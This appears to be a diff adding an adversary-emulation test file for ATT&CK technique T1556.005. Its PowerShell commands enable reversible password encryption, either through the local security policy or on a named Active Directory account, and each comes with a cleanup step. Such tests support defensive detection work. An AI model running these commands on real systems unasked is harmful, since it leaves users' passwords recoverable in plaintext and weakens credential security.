@@ -1,0 +1,52 @@
+attack_technique: T1556.005
+display_name: 'Modify Authentication Process: Reversible Encryption'
+atomic_tests:
+- name: Enable Reversible Password Encryption via Local Security Policy
+  auto_generated_guid: 03ad6066-c361-4280-8c96-8211585dfb87
+  description: |
+    Enables the "Store passwords using reversible encryption" security setting on a Windows host by exporting the local security policy with secedit, flipping ClearTextPassword from 0 to 1, and re-applying it. When enabled, passwords set/changed afterward are recoverable in plaintext. The cleanup restores the original policy. Requires administrative privileges.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      secedit /export /cfg "$env:TEMP\T1556.005_secpol_backup.inf" /areas SECURITYPOLICY | Out-Null
+      $cfg = Get-Content "$env:TEMP\T1556.005_secpol_backup.inf"
+      $cfg = $cfg -replace 'ClearTextPassword\s*=\s*0','ClearTextPassword = 1'
+      $cfg | Set-Content "$env:TEMP\T1556.005_secpol_apply.inf"
+      secedit /configure /db "$env:windir\security\database\T1556005.sdb" /cfg "$env:TEMP\T1556.005_secpol_apply.inf" /areas SECURITYPOLICY | Out-Null
+      Write-Host "Reversible password encryption enabled (ClearTextPassword = 1)"
+    cleanup_command: |
+      secedit /configure /db "$env:windir\security\database\T1556005.sdb" /cfg "$env:TEMP\T1556.005_secpol_backup.inf" /areas SECURITYPOLICY | Out-Null
+      Remove-Item "$env:TEMP\T1556.005_secpol_backup.inf","$env:TEMP\T1556.005_secpol_apply.inf","$env:windir\security\database\T1556005.sdb" -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Enable Reversible Password Encryption on a Domain Account
+  auto_generated_guid: f0127a84-2264-4bfd-bfcf-baf53a7d5d26
+  description: |
+    Sets the AllowReversiblePasswordEncryption property to true on a specific Active Directory account using the ActiveDirectory PowerShell module. After the account next changes its password, the plaintext becomes recoverable from the userParameters attribute. Requires the RSAT ActiveDirectory module, a domain-joined host, and administrative privileges.
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: SamAccountName of the target Active Directory account
+      type: string
+      default: AtomicUser
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The ActiveDirectory PowerShell module must be installed.
+    prereq_command: |
+      if (Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Install-WindowsFeature RSAT-AD-PowerShell -ErrorAction SilentlyContinue
+      Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0" -ErrorAction SilentlyContinue
+  executor:
+    command: |
+      Import-Module ActiveDirectory
+      Set-ADUser -Identity "#{username}" -AllowReversiblePasswordEncryption $true
+      Write-Host "AllowReversiblePasswordEncryption set to True for #{username}"
+    cleanup_command: |
+      Import-Module ActiveDirectory
+      Set-ADUser -Identity "#{username}" -AllowReversiblePasswordEncryption $false -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
